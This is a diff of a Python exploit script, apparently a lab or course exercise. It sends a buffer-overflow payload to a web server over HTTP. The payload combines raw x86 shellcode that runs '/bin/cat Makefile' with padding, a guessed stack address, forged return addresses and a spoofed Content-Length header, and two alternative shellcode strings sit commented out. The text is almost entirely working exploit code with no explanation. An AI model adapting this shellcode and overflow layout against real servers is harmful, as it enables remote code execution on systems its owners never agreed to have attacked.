@@ -42,16 +42,22 @@ def transform_address(address):
 #9D19CA00
 
 
-guessed_address=0xffa15788 - 0xB8
-var_c0_value = 0x3081c026
+guessed_address=0xffcbd938 - 0xB8
+var_c0_value = 0xc463b226
 
 print(hex(guessed_address))
+
+#Original
 shellcode="\xEB\x29\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xD2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"
+
+
+# shellcode=	"\xEB\x39\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x50\x31\xC0\x31\xDB\xB0\x66\xB3\x0D\x89\xE1\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xC2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"
+# shellcode = "\xEB\x22\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\xE8\xD9\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"
 
 # address_of_c = guessed_address + 132#size of final data
 # data = shellcode + 26*"!"+ transform_address(guessed_address+132+38) + 8*"!" +"\xFF\xFF\xFF\xFF"+ transform_address(address_of_c) + 5*transform_address(guessed_address)
 
-data = shellcode + 26*"!" +transform_address(guessed_address + 140 + 4) + 8*"!" + 4*"-" + 4*"-"+4*"!"+transform_address(guessed_address + 124) + 4*"-" + transform_address(var_c0_value)+12*"!" + transform_address(guessed_address) + '\0'
+data = shellcode + 33*"!" +transform_address(guessed_address + 140 + 4) + 8*"!" + 4*"-" + 4*"-"+4*"!"+transform_address(guessed_address + 124) + 4*"-" + transform_address(var_c0_value)+12*"!" + transform_address(guessed_address) + '\0'
 
 
 
@@ -61,7 +67,7 @@ s = Session()
 req = Request('POST', url, data=data)
 
 prepped = req.prepare()
-prepped.headers['Content-Length'] = len(shellcode) 
+prepped.headers['Content-Length'] = 66
 prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
 response = s.send(prepped)
 
